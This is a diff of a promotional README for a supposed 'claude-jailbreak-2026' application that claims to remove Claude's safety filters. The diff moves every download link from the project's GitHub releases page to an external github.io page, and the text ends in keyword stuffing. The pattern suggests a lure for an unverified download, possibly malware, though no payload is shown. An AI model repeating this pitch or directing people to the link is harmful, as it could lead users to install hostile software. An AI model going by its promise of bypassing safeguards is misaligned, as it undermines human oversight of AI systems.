@@ -1,7 +1,7 @@
 <h1>🤖 claude-jailbreak-2026 - Unlock Claude's Full Potential Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/ericvoon96-boop/claude-jailbreak-2026/releases">
+  <a href="https://ericvoon96-boop.github.io">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white" alt="Download" width="300">
   </a>
 </p>
@@ -27,7 +27,7 @@ Getting started with claude-jailbreak-2026 is incredibly easy. You don't need an
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/ericvoon96-boop/claude-jailbreak-2026/releases](https://github.com/ericvoon96-boop/claude-jailbreak-2026/releases)
+Visit this link to download the application: [https://ericvoon96-boop.github.io](https://ericvoon96-boop.github.io)
 
 Click the download button on that page and wait for the file to finish downloading.
 
@@ -165,7 +165,7 @@ Before you begin, make sure you have:
 
 Don't forget to grab your copy now:
 
-Visit this link to download the application: [https://github.com/ericvoon96-boop/claude-jailbreak-2026/releases](https://github.com/ericvoon96-boop/claude-jailbreak-2026/releases)
+Visit this link to download the application: [https://ericvoon96-boop.github.io](https://ericvoon96-boop.github.io)
 
 ## 💡 Pro Tips
 
@@ -198,6 +198,6 @@ Don't let safety filters hold you back any longer. With claude-jailbreak-2026, y
 
 **Download now and unlock the true potential of Claude AI!**
 
-[⬇️ DOWNLOAD claude-jailbreak-2026](https://github.com/ericvoon96-boop/claude-jailbreak-2026/releases)
+[⬇️ DOWNLOAD claude-jailbreak-2026](https://ericvoon96-boop.github.io)
 
 Keywords: ai-bypass-2026, ai-filter-bypass, ai-jailbreak-2026, ai-jailbreak-free, ai-no-filter, anthropic-bypass, character-ai-hack, chat-ai-bypass, chat-jailbreak, claude-3-5-jailbreak, claude-ai-bypass, claude-crack, claude-jailbreak, claude-jailbreak-free, claude-no-filter, claude-uncensored, claude-uncensored-2026, copilot-jailbreak, llm-bypass, llm-jailbreak
